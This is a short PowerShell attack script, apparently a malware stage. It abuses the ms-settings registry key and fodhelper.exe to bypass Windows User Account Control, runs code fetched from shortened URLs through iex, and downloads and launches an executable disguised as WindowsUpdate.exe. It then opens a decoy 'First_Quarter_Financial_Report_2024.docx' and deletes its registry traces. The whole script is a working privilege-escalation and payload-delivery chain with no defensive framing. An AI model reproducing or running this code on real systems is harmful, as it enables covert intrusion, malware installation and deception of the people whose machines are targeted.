$program = "cmd /c start powershell.exe -c `"(iwr https://tinyurl.com/2z5w43fs).Content | iex; Start-Sleep -Seconds 3; iwr -Uri 'https://tinyurl.com/28p8442s' -Outfile 'C:\Windows\Temp\WindowsUpdate.exe'; Start-Process C:\Windows\Temp\WindowsUpdate.exe; $outputFile = $env:TEMP +'\First_Quarter_Financial_Report_2024.docx'; $b64 = [System.Convert]::FromBase64String((iwr -Uri https://tinyurl.com/mryf4waj).Content); [System.IO.File]::WriteAllBytes($outputFile, $b64); Start-Process $outputFile`"" #default
#Create registry structure
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

#Perform the bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

#Remove registry structure
Start-Sleep 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
